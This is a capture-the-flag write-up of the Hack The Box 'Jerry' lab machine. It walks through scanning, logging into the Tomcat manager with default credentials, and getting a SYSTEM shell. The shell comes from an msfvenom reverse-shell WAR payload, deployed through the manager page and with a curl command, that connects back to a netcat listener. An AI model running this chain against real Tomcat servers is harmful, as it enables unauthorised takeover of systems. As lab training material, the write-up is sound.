## Default Information
IP Address: 10.10.10.95\
OS: Windows

## Discovery

Before we start, let's first add the IP address and the host to our ```/etc/hosts``` file.

```
10.10.10.95    jerry.htb
```
### Masscan
Firstly, we will use masscan to identify the open ports

```
┌──(kali㉿kali)-[~/Desktop]
└─$ sudo masscan -p1-65535,U:1-65535 10.10.10.95 --rate=1000 -e tun0 
Starting masscan 1.3.2 (http://bit.ly/14GZzcT) at 2022-01-12 05:56:07 GMT
Initiating SYN Stealth Scan
Scanning 1 hosts [131070 ports/host]
Discovered open port 8080/tcp on 10.10.10.95  
```

### Nmap
We will then use the open ports obtained from masscan to run a scan using nmap to enumerate the services operating behind each port

| Port Number | Service | Version | State |
|-----|------------------|----------------------|----------------------|
| 8080	| http | Apache Tomcat/Coyote JSP engine 1.1 | Open |

### Gobuster
We will then use Gobuster to find the endpoints that are accessible from http://jerry.htb:8080.

```
http://10.10.10.95:8080/aux                  (Status: 200) [Size: 0]
http://10.10.10.95:8080/com4                 (Status: 200) [Size: 0]
http://10.10.10.95:8080/com2                 (Status: 200) [Size: 0]
http://10.10.10.95:8080/com1                 (Status: 200) [Size: 0]
http://10.10.10.95:8080/com3                 (Status: 200) [Size: 0]
http://10.10.10.95:8080/con                  (Status: 200) [Size: 0]
http://10.10.10.95:8080/docs                 (Status: 302) [Size: 0] [--> /docs/]
http://10.10.10.95:8080/examples             (Status: 302) [Size: 0] [--> /examples/]
http://10.10.10.95:8080/favicon.ico          (Status: 200) [Size: 21630]
http://10.10.10.95:8080/host-manager         (Status: 302) [Size: 0] [--> /host-manager/]
http://10.10.10.95:8080/index.jsp            (Status: 200) [Size: 11398]
http://10.10.10.95:8080/manager              (Status: 302) [Size: 0] [--> /manager/]
http://10.10.10.95:8080/RELEASE-NOTES.txt    (Status: 200) [Size: 9600]
```

### Web-content discovery

Navigating to http://jerry.htb/RELEASE-NOTES.txt, we are able to find that we are using Apache Tomcat Version 7.0.88.
![Apache Tomcat Version](https://github.com/joelczk/writeups/blob/main/HTB/Images/Jerry/version.png)

Navigating to both http://jerry.htb/manager and http://jerry.htb/host-manager, we realize both pages require authentication.

Failing the authentication will bring us to an error page, which displays the default credentials on the website.

![Error Page](https://github.com/joelczk/writeups/blob/main/HTB/Images/Jerry/error_page.png)

## Exploit
### Logging into manager interface
Using the default credentials ```tomcat:s3cret``` that we have obtained earlier, we are able to authenticate into http://jerry.htb:8080/manager. However, we are still unable to authenticate into http://jerry.htb:8080/host-manager.

### Uploading malicious war file

Looking at http://jerry.htb:8080/manager, we realize that we are able to upload a malicious war file that can spawn a reverse shell. 

![Uploading war file](https://github.com/joelczk/writeups/blob/main/HTB/Images/Jerry/upload_war_file.png)

Next, let us use msfvenom to generate a malicious war file that will create a reverse connection to our local listener.

```
┌──(kali㉿kali)-[~/Desktop]
└─$ msfvenom -p java/shell_reverse_tcp -f war LHOST=10.10.16.8 LPORT=80 > reverse.war
Payload size: 13314 bytes
Final size of war file: 13314 bytes
```

Afterwards, we will have to upload the war file onto the Apache Tomcat webserver. Next, we will go to http://jerry.htb/manager/text/list to check if the payload has been successfully uploaded.

![Uploaded payload](https://github.com/joelczk/writeups/blob/main/HTB/Images/Jerry/payload_uploaded.png)

### Obtaining reverse shell
Lastly, all we have to do is to navigate to http://jerry.htb:8080/reverse to start the reverse connection to our local listener.

```
┌──(kali㉿kali)-[~/Desktop]
└─$ nc -nlvp 80
listening on [any] 80 ...
connect to [10.10.16.8] from (UNKNOWN) [10.10.10.95] 49194
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\apache-tomcat-7.0.88>
```

### Obtaining user and root flag

Executing the ```whoami``` command, we can see that we are already granted root privileges. Hence, there is no more need for futhur privilege escalation. 

Viewing the file ```2 for the price of 1.txt```, we are able to obtain both the user and the root flag.

```
C:\Users\Administrator\Desktop\flags>type "2 for the price of 1.txt"
type "2 for the price of 1.txt"
user.txt
<Redacted user flag>

root.txt
<Redacted root flag>
```

## Post_Exploitation
### Alternative way of RCE on Apache Tomcat

Another alternative way of uploading the exploit war file to the target server will be using the curl command. We can use the curl command to upload the exploit war file to the target server, with the credentials that we have obtained earlier. 

In the command below, we are uploading the exploit war file in the /exploit path.
```
┌──(kali㉿kali)-[~/Desktop]
└─$ curl --upload-file exploit.war -u 'tomcat:s3cret' "http://jerry.htb:8080/manager/text/deploy?path=/exploit"
OK - Deployed application at context path /exploit
```

Visiting http://jerry.htb:8080/exploit on the browser will then trigger the exploit and a reverse connection to the local listener will then be created.

```
┌──(kali㉿kali)-[~]
└─$ nc -nlvp 80  
listening on [any] 80 ...
connect to [10.10.16.8] from (UNKNOWN) [10.10.10.95] 49195
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\apache-tomcat-7.0.88>whoami
whoami
nt authority\system

C:\apache-tomcat-7.0.88>
```
